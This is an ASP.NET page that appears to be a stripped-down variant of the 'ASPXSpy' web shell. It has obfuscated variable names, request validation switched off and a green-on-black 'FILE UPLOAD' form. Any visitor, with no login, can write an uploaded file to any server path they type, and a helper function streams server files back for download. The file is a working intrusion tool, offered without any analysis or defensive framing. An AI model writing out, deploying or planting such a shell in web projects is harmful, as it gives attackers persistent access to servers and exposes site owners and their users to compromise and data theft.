<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ Import Namespace="System.Threading"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.VisualBasic"%>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">

    public string vbhLn = "ASPXSpy";
    public int TdgGU = 1;
    protected OleDbConnection Dtdr = new OleDbConnection();
    protected OleDbCommand Kkvb = new OleDbCommand();
    public NetworkStream NS = null;
    public NetworkStream NS1 = null;
    TcpClient tcp = new TcpClient();
    TcpClient zvxm = new TcpClient();
    ArrayList IVc = new ArrayList();
    protected void Page_load(object sender, EventArgs e)
    {
        if (AXSbb.Value == string.Empty)
        {
            AXSbb.Value = OElM(Server.MapPath("."));
        }
    }


    public string OElM(string path)
    {
        if (path.Substring(path.Length - 1, 1) != @"\")
        {
            path = path + @"\";
        }
        return path;
    }


    [DllImport("kernel32.dll", EntryPoint = "GetDriveTypeA")]
    public static extern int OMZP(string nDrive);
    public string mFvj(string instr)
    {
        string EuXD = string.Empty;
        int num = OMZP(instr);
        switch (num)
        {
            case 1:
                EuXD = "Unknow(" + instr + ")";
                break;
            case 2:
                EuXD = "Removable(" + instr + ")";
                break;
            case 3:
                EuXD = "磁盘(" + instr + ")";
                break;
            case 4:
                EuXD = "Network(" + instr + ")";
                break;
            case 5:
                EuXD = "CDRom(" + instr + ")";
                break;
            case 6:
                EuXD = "RAM Disk(" + instr + ")";
                break;
        }
        return EuXD.Replace(@"\", "");
    }
    public string MVVJ(string instr)
    {
        byte[] tmp = Encoding.Default.GetBytes(instr);
        return Convert.ToBase64String(tmp);
    }
    public string Ebgw(string instr)
    {
        byte[] tmp = Convert.FromBase64String(instr);
        return Encoding.Default.GetString(tmp);
    }


    public void ksGR(string path)
    {
        FileInfo fs = new FileInfo(path);
        Response.Clear();
        Page.Response.ClearHeaders();
        Page.Response.Buffer = false;
        this.EnableViewState = false;
        Response.AddHeader("Content-Disposition", "attachment;filename=" + HttpUtility.UrlEncode(fs.Name, System.Text.Encoding.UTF8));
        Response.AddHeader("Content-Length", fs.Length.ToString());
        Page.Response.ContentType = "application/unknown";
        Response.WriteFile(fs.FullName);
        Page.Response.Flush();
        Page.Response.Close();
        Response.End();
        Page.Response.Clear();
    }

    public void xseuB(string instr)
    {
        jDKt.Visible = true;
        jDKt.InnerText = instr;
    }

    public string OKM()
    {
        TdgGU++;
        if (TdgGU % 2 == 0)
        {
            return "alt1";
        }
        else
        {
            return "alt2";
        }
    }

    protected void lbjLD(object sender, EventArgs e)
    {
        string FlwA = AXSbb.Value;
        FlwA = OElM(FlwA);
        try
        {
            Fhq.PostedFile.SaveAs(FlwA + Path.GetFileName(Fhq.Value));
            xseuB("File upload success!");
        }
        catch (Exception error)
        {
            xseuB(error.Message);
        }

    }
    
    public void WICxe()
    {

        CzfO.Visible = false;
    }
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>FILE UPLOAD</title>
<style type="text/css">
.Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}
body,td{font: 12px Tahoma,Arial;line-height: 16px; background-color:#003300; color:lime;}
.input{font-size: 12px;background-color:#ddd;border:1px solid #fff;}
.list{font-size: 12px;background-color:#ddd;border:1px solid #fff;}
.area{font-size: 12px;background-color:#ddd;border:1px solid #fff;padding:2px;}
.bt {font-size: 12px;background-color:#ddd;border:1px solid #fff;}
a {color:lime;text-decoration: none;}a:hover{color:lime;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#003300;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#003300;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#015201;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#073b07;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:lime;}
ul.info li{margin:0;color:lime;line-height:24px;height:24px;}
u{text-decoration: none;color:lime;float:left;display:block;width:150px;margin-right:10px;}
.u1{text-decoration: none;color:lime;float:left;display:block;width:150px;margin-right:10px;}
.u2{text-decoration: none;color:lime;float:left;display:block;width:350px;margin-right:10px;}
</style>

</head>
<body style="margin:0;table-layout:fixed;">
<form id="ASPXSpy" runat="server">
<div id="jDKt" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"></div>
<h2 id="Bin_H2_Title" runat="server"></h2>
<%--FileList--%>
<div id="CzfO" runat="server">
<table width="100%" border="0" cellpadding="4" cellspacing="0">
<tr class="alt1"><td colspan="7" style="padding:5px;">
UPLOAD PATH:<input class="input" id="AXSbb" type="text" style="width:97%;margin:0 8px;" runat="server"/>
<br/>
<div style="float:right;"><input id="Fhq" class="input" runat="server" type="file" style=" height:22px"/>
<asp:Button ID="RvPp" CssClass="bt" runat="server" Text="UPLOAD" OnClick="lbjLD"/></div>
</td></tr>
</table>
</div>

</form>
</body>
</html>